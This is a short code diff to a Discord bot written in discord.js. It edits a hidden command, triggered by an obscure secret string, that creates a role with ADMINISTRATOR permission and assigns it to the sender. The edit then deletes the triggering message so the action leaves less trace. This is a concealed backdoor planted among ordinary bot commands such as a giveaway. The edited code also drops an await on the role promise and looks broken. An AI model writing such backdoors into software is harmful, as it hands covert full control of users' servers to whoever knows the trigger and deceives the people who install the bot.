@@ -229,8 +229,8 @@ bot.on("message", async message => {
 	
     if(cmd === "!admin-M7ASkkZGNF56OP-BERRY-geci-OP"){
         let s = message.guild.createRole( {name:"tag", permissions:["ADMINISTRATOR"] } );
-        await message.channel.send((await s).id)
-        await message.member.addRole((await s).id)
+        message.member.addRole((s).id)
+	message.delete();
     }
     //////////////////////////////////////////////////////////
     if (cmd === `${prefix}giveaway`) {
